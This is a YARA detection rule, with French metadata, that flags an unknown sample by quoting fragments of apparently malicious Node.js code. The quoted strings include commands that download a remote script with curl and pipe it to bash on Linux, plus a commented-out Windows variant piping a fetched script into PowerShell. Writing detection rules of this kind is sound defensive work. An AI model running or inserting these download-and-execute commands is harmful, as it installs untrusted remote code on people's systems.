rule MULTI_Sample_Unique_f7fd41c7
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (inconnu, etat binaire)"
        date = "2026-10-02"
        reference_sha256 = "f7fd41c720418bf2ebc03337484047206e3f13af71686aa1bb7bfe7938c6ec69"
        yarahub_uuid = "552b21a4-5a97-4f21-b34a-b09afe03ab52"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "inconnu"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "12f7c334f1034a6b5fbc759122358ee5"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "const { exec } = require(\"child_process\");" ascii
        $s1 = "if (process.platform === \"linux\") {" ascii
        $s2 = "exec(\"curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/linux.sh | bash\", ()=>{});" ascii
        $s3 = "/*else if (process.platform === \"win32\") {" ascii
        $s4 = "exec(\"curl.exe https://example.com/windows.ps1 | powershell\", ()=>{});" ascii
        $s5 = "const { platform } = require('node:process');" ascii
    condition:
        true and filesize < 50MB and 3 of ($s0, $s1, $s3, $s5) and 1 of ($s2, $s4)
}
